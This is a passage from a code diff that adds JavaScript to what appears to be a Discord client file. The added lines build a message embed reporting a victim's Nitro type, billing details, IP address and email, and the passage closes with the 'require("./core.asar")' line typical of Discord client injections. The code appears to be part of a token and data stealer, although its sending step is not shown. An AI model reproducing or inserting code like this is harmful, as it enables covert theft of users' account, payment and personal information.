+                            name: "<:1336:1012707326223982692> Nitro Type:",
+                            value: `\`${getNitro(userInfo.premium_type)}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<a:1336:1012707511830331442> Billing:",
+                            value: `\`${billing}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<:1336:1012707773424865310> IP:",
+                            value: `${ip}`,
+                            inline: true
+                        },
+                        {
+                            name: "<:1336:1012707970653626408> Email:",
+                            value: `${email}`,
+                            inline: true
+                        },]
+                    })]
+                })
+            }
+
+        }
+    }
+}
+
+module.exports = require("./core.asar");
